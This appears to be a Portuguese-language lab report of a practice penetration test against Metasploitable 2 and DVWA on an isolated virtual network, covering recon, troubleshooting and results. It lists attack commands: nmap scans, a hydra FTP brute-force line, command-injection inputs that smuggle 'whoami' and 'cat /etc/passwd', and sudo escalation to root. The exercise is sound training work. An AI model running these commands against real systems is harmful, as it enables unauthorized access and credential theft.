## 1. Objetivo

Realizar uma simulação prática de ataque em ambiente controlado, com o objetivo de demonstrar conhecimentos em segurança da informação, incluindo:
Reconhecimento de rede
Enumeração de serviços
Exploração de vulnerabilidades
Obtenção de acesso ao sistema
Escalada de privilégios

## 2. Ambiente

- VirtualBox 
- SOs usados: Kali Linux (máquina atacante), Metasploitable 2 (máquina alvo)
- Tipo de rede: Host-Only (rede interna isolada)
## 3. Configuração

IPs definidos
- Kali Linux: 192.168.100.10
- Metasploitable: 192.168.100.20

Comandos Usados

Kali Linux:
- `nmap -sn 192.168.100.0/24` - Reconhecimento de rede
- `nmap -sV 192.168.100.20` - Identificação de serviços
- `hydra -l msfadmin -P small-list-pass.txt ftp://192.168.100.20` - Ataque de força bruta (FTP)
- `ftp 192.168.100.20` - Acesso via FTP
- `http://192.168.100.20/dvwa` - Acesso web (DVWA) e entrei com login padrão (admin/password)
- `127.0.0.1; whoami` - `127.0.0.1; uname -a` - `127.0.0.1; cat /etc/passwd` - Exploração de vulnerabilidade (Command Injection)
- `ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@192.168.100.20` - Acesso via SSH
- `sudo -l` - `sudo su` - Escalada de privilégio


## 4. Problemas e solução

Problema 1 — Erro na rede do VirtualBox
Falha ao iniciar a VM com erro de adaptador Host-Only
Solução: recriar adaptador de rede Host-Only

Problema 2 — IP sumindo no Kali
Interface de rede perdia configuração
Solução: percebi que tinha configurado o ip na interface errada, depois configurei na interface correta (eth1)

Problema 3 — Erro no SSH (algoritmos)
Causa: incompatibilidade entre criptografia antiga e cliente moderno
Solução: forçar algoritmos no comando SSH

## 5. Resultado final

Ao final da simulação, foi possível:

Identificar o host ativo na rede
Enumerar serviços vulneráveis (FTP, HTTP, SSH)
Realizar ataque de força bruta no FTP
Obter acesso ao sistema via credenciais válidas
Identificar aplicações web vulneráveis
Explorar falha de Command Injection no Damn Vulnerable Web Application (DVWA)
Executar comandos remotamente no servidor
Acessar o sistema via SSH
Realizar escalada de privilégios
Obter acesso total como root